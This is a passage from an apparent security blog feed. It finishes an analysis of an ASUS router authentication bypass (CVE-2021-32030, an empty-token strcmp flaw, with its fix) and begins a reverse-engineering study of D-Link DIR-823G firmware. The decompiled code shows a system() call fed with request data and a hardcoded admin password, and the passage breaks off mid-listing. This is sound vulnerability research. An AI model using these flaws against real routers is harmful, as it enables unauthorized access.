snprintf(token, 0x20u, <span class="string">"%s"</span>, &amp;asus_token_value[v19]);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_5B478(token, <span class="number">0</span>) &amp;&amp; !sub_59588(token) )// 验证是否通过</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !sub_5FFAC() )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( !strcmp(last_fail_token, token) )</span><br><span class="line">        {</span><br><span class="line">          add_try = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          strlcpy(last_fail_token, token, <span class="number">32</span>);</span><br><span class="line">          add_try = <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        v22 = _errno_location();</span><br><span class="line">        v23 = *v22;</span><br><span class="line">        v24 = v22;</span><br><span class="line">        <span class="keyword">if</span> ( f_exists(<span class="string">"/tmp/HTTPD_DEBUG"</span>) &gt; <span class="number">0</span> || nvram_get_int(<span class="string">"HTTPD_DBG"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">          Debug2File(<span class="string">"/jffs/HTTPD_DEBUG.log"</span>, <span class="string">"[%s:(%d)]: AUTHFAIL\\n"</span>, <span class="string">"auth_check"</span>, <span class="number">1055</span>);</span><br><span class="line">        result = <span class="number">2</span>;</span><br><span class="line">        *v24 = v23;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      }</span><br><span class="line">LABEL_27:</span><br><span class="line">      sub_5F004(fromapp, url);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( !strncmp(url, <span class="string">"get_IFTTTPincode.cgi"</span>, 0x14u) || !strncmp(url, <span class="string">"get_IFTTTtoken.cgi"</span>, 0x12u) )</span><br><span class="line">      sub_5F8B8();</span><br><span class="line">    result = cur_login_ip_type;</span><br><span class="line">    <span class="keyword">if</span> ( cur_login_ip_type )</span><br><span class="line">    {</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      login_try_wan = <span class="number">0</span>;</span><br><span class="line">      last_login_timestamp_wan = <span class="number">0</span>;</span><br><span class="line">      v20 = lock_flag &amp; <span class="number">0xFFFFFFFD</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      login_try = <span class="number">0</span>;</span><br><span class="line">      last_login_timestamp = <span class="number">0</span>;</span><br><span class="line">      v20 = lock_flag &amp; <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    }</span><br><span class="line">    lock_flag = v20;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>检查登录失败的锁定状态，如果连续失败超过5次则进行锁定</p><p>从cookies中取出asus_token然后调用两个函数进行token检查，下面关注sub_59588函数</p><p>通过登录则失败次数清0，重新开始</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall sub_59588(const char *token)</span><br><span class="line">{</span><br><span class="line">  char *v2; // r0</span><br><span class="line">  char *v3; // r0</span><br><span class="line"></span><br><span class="line">  v2 = my_nvram_get(<span class="string">"ifttt_token"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(token, v2) )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">"/tmp/IFTTT_ALEXA"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(<span class="string">"/tmp/IFTTT_ALEXA.log"</span>, <span class="string">"[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.\\n"</span>, <span class="string">"check_ifttt_token"</span>, <span class="number">761</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">"/tmp/IFTTT_ALEXA"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(<span class="string">"/tmp/IFTTT_ALEXA.log"</span>, <span class="string">"[%s:(%d)][HTTPD] IFTTT/ALEXA long token fail.\\n"</span>, <span class="string">"check_ifttt_token"</span>, <span class="number">767</span>);</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">"/tmp/IFTTT_ALEXA"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(</span><br><span class="line">        <span class="string">"/tmp/IFTTT_ALEXA.log"</span>,</span><br><span class="line">        <span class="string">"[%s:(%d)][HTTPD] IFTTT/ALEXA long token is %s.\\n"</span>,</span><br><span class="line">        <span class="string">"check_ifttt_token"</span>,</span><br><span class="line">        <span class="number">768</span>,</span><br><span class="line">        token);</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">"/tmp/IFTTT_ALEXA"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      v3 = my_nvram_get(<span class="string">"ifttt_token"</span>);</span><br><span class="line">      Debug2File(<span class="string">"/tmp/IFTTT_ALEXA.log"</span>, <span class="string">"[%s:(%d)][HTTPD] httpd long token is %s.\\n"</span>, <span class="string">"check_ifttt_token"</span>, <span class="number">769</span>, v3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从配置中读取token，然后将取出的token和配置中的token进行比较，如果相等则token检查通过</p><p>这里就出现了一个问题，因为是用strcmp进行比较的，如果取出的token为空，那么就可以绕过strcmp使得检查通过，导致认证绕过漏洞的发生</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复也很简单，判断一下从header中取出的token是否为空即可</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;CVE-2021-32030-ASUS身份验证绕过&quot;&gt;&lt;a href=&quot;#CVE-2021-32030-ASUS身份验证绕过&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-32030 AS</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.z1r0.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>DIR-823G Equipment Analysis</title>
    <link href="https://www.z1r0.top/2023/08/15/DIR-823G-Equipment-Analysis/"/>
    <id>https://www.z1r0.top/2023/08/15/DIR-823G-Equipment-Analysis/</id>
    <published>2023-08-15T08:05:56.000Z</published>
    <updated>2023-08-29T08:27:58.675Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="DIR-823G-Equipment-Analysis"><a href="#DIR-823G-Equipment-Analysis" class="headerlink" title="DIR-823G Equipment Analysis"></a>DIR-823G Equipment Analysis</h1><h2 id="Preliminary-Analysis"><a href="#Preliminary-Analysis" class="headerlink" title="Preliminary Analysis"></a>Preliminary Analysis</h2><p>I came into contact with this device during security research, and I took time to briefly study this device in depth.</p><h3 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h3><p>The firmware used in this analysis is <code>1.0.2B05</code>, and the download address is</p><p><a href="http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823G">http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823G</a></p><h3 id="Web-Service-Architecture-Analysis"><a href="#Web-Service-Architecture-Analysis" class="headerlink" title="Web Service Architecture Analysis"></a>Web Service Architecture Analysis</h3><p>We can directly use binwalk to unpack this firmware package.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">14:39:22 z1r0@z1r0deMacBook-Pro.<span class="built_in">local</span> 823G binwalk DIR823G_V1.0.2B05_20181207.bin</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">10264         0x2818          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 7053972 bytes</span><br><span class="line">2057250       0x1F6422        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 4168788 bytes, 953 inodes, blocksize: 131072 bytes, created: 2038-05-18 09:48:48</span><br></pre></td></tr></tbody></table></figure><p>After unpacking, you can see following things.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">14:53:16 z1r0@z1r0deMacBook-Pro.<span class="built_in">local</span> squashfs-root l</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x@  17 z1r0  staff   544B Dec  4  2018 .</span><br><span class="line">drwxr-xr-x    9 z1r0  staff   288B Aug  7 14:43 ..</span><br><span class="line">drwxr-xr-x@ 184 z1r0  staff   5.8K Aug  7 14:43 bin</span><br><span class="line">drwxr-xr-x@   8 z1r0  staff   256B Dec  4  2018 dev</span><br><span class="line">drwxr-xr-x@  40 z1r0  staff   1.3K Dec  4  2018 etc</span><br><span class="line">drwxr-xr-x@   2 z1r0  staff    64B Dec  4  2018 home</span><br><span class="line">lrwxr-xr-x@   1 z1r0  staff     8B Dec  4  2018 init -&gt; bin/init</span><br><span class="line">drwxr-xr-x@  27 z1r0  staff   864B Dec  4  2018 lib</span><br><span class="line">drwxr-xr-x@   2 z1r0  staff    64B Dec  4  2018 mnt</span><br><span class="line">drwxr-xr-x@   2 z1r0  staff    64B Dec  4  2018 proc</span><br><span class="line">lrwxr-xr-x@   1 z1r0  staff     9B Dec  4  2018 root -&gt; /var/root</span><br><span class="line">drwxr-xr-x@   2 z1r0  staff    64B Dec  4  2018 sys</span><br><span class="line">lrwxr-xr-x@   1 z1r0  staff     8B Dec  4  2018 tmp -&gt; /var/tmp</span><br><span class="line">drwxr-xr-x@   3 z1r0  staff    96B Dec  4  2018 usr</span><br><span class="line">drwxr-xr-x@   2 z1r0  staff    64B Dec  4  2018 var</span><br><span class="line">drwxr-xr-x@  84 z1r0  staff   2.6K Dec  4  2018 web</span><br><span class="line">drwxr-xr-x@  41 z1r0  staff   1.3K Dec  4  2018 web_mtn</span><br></pre></td></tr></tbody></table></figure><p>I checked the rcS file first (<code>./etc/init.d/rcS</code>), I found goahead web server, so I will analyze goahead</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"><span class="comment">#boa</span></span><br><span class="line"></span><br><span class="line">goahead &amp;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$MODE</span>"</span> = <span class="string">"HW_FACTORY_MODE=1"</span> ];<span class="keyword">then</span></span><br><span class="line">telnetd&amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#telnetd&amp;</span></span><br><span class="line">ifconfig wlan1-va3 down</span><br><span class="line">speedcheck&amp;</span><br><span class="line"><span class="comment">#wiair_client&amp;</span></span><br></pre></td></tr></tbody></table></figure><p>The goahead is a small web server. The relevant code is as follows.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Debug: Goahead start"</span>, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( daemon(<span class="number">1</span>, <span class="number">1</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    perror(<span class="string">"error daemon.../n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  sub_4030F0(<span class="number">0</span>, <span class="number">61440</span>, <span class="number">1</span>);</span><br><span class="line">  signal(<span class="number">13</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !apmib_init() )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_423CCC() &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt;= <span class="number">2</span> )</span><br><span class="line">    off_5890B0 = <span class="string">"/tmp/web_mtn"</span>;</span><br><span class="line">  sub_46EC40();</span><br><span class="line">  <span class="keyword">if</span> ( sub_423F90() &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !dword_58A6D0 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( sub_410294(<span class="number">-1</span>) || sub_410410(<span class="number">-1</span>, <span class="number">1000</span>) )</span><br><span class="line">      sub_410944(<span class="number">-1</span>);</span><br><span class="line">    sub_40468C();</span><br><span class="line">    sub_4210F0();</span><br><span class="line">  }</span><br><span class="line">  sub_4159C4();</span><br><span class="line">  sub_41BDA0();</span><br><span class="line">  sub_40F7C4();</span><br><span class="line">  sub_40322C();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>This binary file has the symbol table stripped, in the <code>sub_423CCC</code> function, the function will parse the requested URL</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_423F90</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">4</span>]; <span class="comment">// [sp+30h] [+30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">128</span>]; <span class="comment">// [sp+40h] [+40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+C0h] [+C0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  sub_423E90((<span class="type">int</span>)<span class="string">"br0"</span>, (<span class="type">int</span>)v4);</span><br><span class="line">  sub_40F750();</span><br><span class="line">  sub_4158C0();</span><br><span class="line">  sub_416908(<span class="string">"adm"</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">"admin"</span> &amp;&amp; aAdmin[<span class="number">0</span>] &amp;&amp; <span class="string">"1234"</span> &amp;&amp; a1234[<span class="number">0</span>] )</span><br><span class="line">  {</span><br><span class="line">    sub_415F5C(<span class="string">"admin"</span>, (<span class="type">int</span>)<span class="string">"1234"</span>, (<span class="type">int</span>)<span class="string">"adm"</span>);</span><br><span class="line">    sub_4172CC(<span class="string">"/"</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="string">"adm"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    error(<span class="string">"goahead.c"</span>, <span class="number">502</span>, <span class="number">2</span>, <span class="string">"gohead.c: Warning: empty administrator account or password"</span>);</span><br><span class="line">  }</span><br><span class="line">  v3 = inet_addr(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">  {</span><br><span class="line">    error(<span class="string">"goahead.c"</span>, <span class="number">531</span>, <span class="number">2</span>, <span class="string">"initWebs: failed to convert %s to binary ip data"</span>, (<span class="type">const</span> <span class="type">char</span> *)v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">strcpy</span>(v5, off_5890B0);</span><br><span class="line">    sub_40542C(v5);</span><br><span class="line">    v2 = inet_ntoa(v3);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">strlen</span>(v2) + <span class="number">1</span>) &gt;= <span class="number">0x80</span> )</span><br><span class="line">      v1 = <span class="number">128</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v1 = <span class="built_in">strlen</span>(v2) + <span class="number">1</span>;</span><br><span class="line">    sub_40D104(v6, v2, v1);</span><br><span class="line">    sub_4205C0((<span class="type">int</span>)v6);</span><br><span class="line">    sub_42051C(v6);</span><br><span class="line">    sub_4053C4(<span class="string">"default.asp"</span>);</span><br><span class="line">    sub_411D4C(off_5890B4);</span><br><span class="line">    sub_41BC40(dword_5890B8, dword_5890BC);</span><br><span class="line">    websUrlHandlerDefine(&amp;dword_4A3C4C, <span class="number">0</span>, <span class="number">0</span>, sub_4110F4);</span><br><span class="line">    websUrlHandlerDefine(<span class="string">"/HNAP1"</span>, <span class="number">0</span>, <span class="number">0</span>, websHNAPHandler);</span><br><span class="line">    websUrlHandlerDefine(<span class="string">"/goform"</span>, <span class="number">0</span>, <span class="number">0</span>, websFormHandler);</span><br><span class="line">    websUrlHandlerDefine(<span class="string">"/cgi-bin"</span>, <span class="number">0</span>, <span class="number">0</span>, websCgiHandler);</span><br><span class="line">    websUrlHandlerDefine(<span class="string">"/EXCU_SHELL"</span>, <span class="number">0</span>, <span class="number">0</span>, sub_4234CC);</span><br><span class="line">    websUrlHandlerDefine(&amp;dword_4A3C4C, <span class="number">0</span>, <span class="number">0</span>, sub_404940);</span><br><span class="line">    sub_4110B4();</span><br><span class="line">    websUrlHandlerDefine(<span class="string">"/"</span>, <span class="number">0</span>, <span class="number">0</span>, sub_424320);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>websHNAPHandler</code> function will handle the <code>/HNAP1</code> request.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">websHNAPHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a1,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a2,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a3,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a4,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> arg0a,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> arg4,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> arg8,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> argC,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a5,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a6,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a7,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a8,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a9,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a10,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a11)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+34h] [+34h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+38h] [+38h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+40h] [+40h]</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">104</span>]; <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [sp+B4h] [+B4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v21[<span class="number">5000</span>]; <span class="comment">// [sp+B8h] [+B8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(</span><br><span class="line">    v19,</span><br><span class="line">    <span class="string">"HTTP/1.0 200 OK\\r\\nContent-Type: text/html; charset=utf-8\\r\\nConnection: close\\r\\nCache-Control: private\\r\\n\\r\\n"</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  dword_58A6C0 = a1;</span><br><span class="line">  v16 = <span class="built_in">malloc</span>(<span class="number">10240</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(v16, <span class="number">0</span>, <span class="number">10240</span>);</span><br><span class="line">    v17 = <span class="built_in">malloc</span>(<span class="number">51200</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="number">51200</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">1316</span>) )</span><br><span class="line">      {</span><br><span class="line">        apmib_get(<span class="number">7011</span>, &amp;v20);</span><br><span class="line">        <span class="keyword">for</span> ( hnap_func_ptr = (<span class="type">int</span>)&amp;HnapFunc; *(_DWORD *)hnap_func_ptr; hnap_func_ptr += <span class="number">8</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(_DWORD *)(a1 + <span class="number">1316</span>), *(_DWORD *)hnap_func_ptr) )</span><br><span class="line">          {</span><br><span class="line">            <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">            <span class="built_in">snprintf</span>(v21, <span class="number">4999</span>, <span class="string">"echo '%s' &gt;/var/hnaplog"</span>, (<span class="type">const</span> <span class="type">char</span> *)a7);</span><br><span class="line">            system(v21);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"wp-&gt;hnapfunc===========&gt;%s\\n"</span>, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">1316</span>));</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(*(_DWORD *)hnap_func_ptr, <span class="string">"GetLocalMac"</span>, <span class="number">11</span>) )</span><br><span class="line">            {</span><br><span class="line">              <span class="built_in">memset</span>(&amp;qword_58A6A0, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">              <span class="built_in">strncpy</span>(&amp;qword_58A6A0, a1 + <span class="number">48</span>, <span class="number">32</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> ( (*(<span class="type">int</span> (__fastcall **)(<span class="type">int</span>))(hnap_func_ptr + <span class="number">4</span>))(a7) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        sub_432FA8(a7);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"websHNAPFuncHandler: not enough memory (1)\\n!"</span>);</span><br><span class="line">      v18 = <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"websHNAPFuncHandler: not enough memory (0)\\n!"</span>);</span><br><span class="line">    v18 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">free</span>(v16);</span><br><span class="line">  <span class="built_in">free</span>(v17);</span><br><span class="line">  <span class="keyword">return</span> v18;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>To obtain the HNAP function name from the request parameters.</p><p>Traverse the array of HnapFunc function pointers, match the hnap function name.</p><p>If it matched, call the corresponding HnapFunc function pointer.</p><p>Next, analyze the <code>websFormHandler</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 